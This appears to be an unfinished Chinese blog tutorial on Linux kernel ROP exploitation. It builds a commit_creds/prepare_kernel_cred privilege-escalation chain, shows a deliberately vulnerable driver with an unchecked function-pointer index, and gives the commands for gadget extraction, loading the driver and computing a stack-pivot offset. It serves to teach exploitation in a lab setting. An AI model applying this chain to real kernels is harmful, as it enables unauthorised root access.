---
layout: post
title: KernelROP
excerpt: "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/"
categories: [未完待续]
comments: true
---

**看本文需要了解的知识:**

`dmesg`命令用于显示开机信息。kernel会将开机信息存储在ring buffer中。您若是开机时来不及查看信息，可利用dmesg来查看。开机信息亦保存在/var/log目录中，名称为dmesg的文件里。

`insmod`命令用于载入模块。Linux有许多功能是通过模块的方式，在需要时才载入kernel。如此可使kernel较为精简，进而提高效率，以及保有较大的弹性。这类可载入的模块，通常是设备驱动程序。

查找内核二进制文件
```
find / -name vmlinux
/usr/lib/debug/usr/lib/modules/3.10.0-1062.4.1.el7.x86_64/vmlinux
```
事先将内核中的gadgets文件保存下来
```
ROPgadget --binary /usr/lib/debug/usr/lib/modules/3.10.0-1062.4.1.el7.x86_64/vmlinux > ropgadget
```
`ret [num]`这样的gadget会将栈指针递增，ret使用一个操作数来表示在获取下一条指令后从栈中弹出的字节数。注意：一个gadget可能是在一个非执行页中，这时要找一个可代换的gadget。

找到`prepare_kernel_cred`和`commit_creds`的地址：
```
grep prepare_kernel_cred /proc/kallsyms
ffffffffb6ecc440 T prepare_kernel_cred
grep commit_creds /proc/kallsyms
ffffffffb6ecc130 T commit_creds
```
ROP链的初步构造如下：
```
+----------------------------------------------+
| 0xffffffff810d783d : pop rdi ; ret           |
+----------------------------------------------+
| NULL                                         |
+----------------------------------------------+
| 0xffffffff81092870 : prepare_kernel_cred     |
+----------------------------------------------+
| 0xffffffff8110eaa3 : pop rdx ; ret           |
+----------------------------------------------+
| 0xffffffff81092570 : commit_creds            |
+----------------------------------------------+
| 0xffffffff81036321 : mov rdi, rax ; call rdx |
+----------------------------------------------+
```
#### 有漏洞的驱动(binary在附件中:kernel_rop-master.zip)
为了演示内核中ROP链的可用性，用以下有漏洞的驱动进行演示：
```c
struct drv_req {
        unsigned long offset;
};
...


static long device_ioctl(struct file *file, unsigned int cmd, unsigned long args) {
        struct drv_req *req;
        void (*fn)(void);

        switch(cmd) {
        case 0:
                req = (struct drv_req *)args;
                printk(KERN_INFO "size = %lx\n", req->offset);
                printk(KERN_INFO "fn is at %p\n", &ops[req->offset]);
                fn = &ops[req->offset];                                     [1]
                fn();
                break;
        default:
                break;
        }

        return 0;
}
```
编译并加载驱动
```c
make && sudo insmod ./drv.ko
make -C /lib/modules/3.10.0-1062.4.1.el7.x86_64/build M=/root/sploitfun/kernelrop/kernel_rop modules
make[1]: 进入目录“/usr/src/kernels/3.10.0-1062.4.1.el7.x86_64”
  Building modules, stage 2.
  MODPOST 1 modules
make[1]: 离开目录“/usr/src/kernels/3.10.0-1062.4.1.el7.x86_64”
# compile the trigger
gcc trigger.c -O2 -o trigger
```
`ops`数组没有进行边界检查。用户提供的偏移量足够大就可以在用户空间或内核空间中访问任何内存地址。
驱动在加载时注册`/dev/vulndrv`设备并打印ops数组地址。

查找ops地址
```
dmesg | grep ops
[616271.889769] addr(ops) = ffffffffc0813320
```
#### 结果
```
chmod 777 /dev/vulndrv
```
编译rop_exploit
```bash
gcc rop_exploit.c -O2 -o rop_exploit
```
```
cat ropgadget | grep ': xchg eax, esp ; ret' > stackpivots
```
```bash
./find_offset.py ffffffffc0813320 stackpivots
offset = 18446744073576518328
gadget = xchg eax, esp ; ret 0x141
stack addr = 8111c8e0
```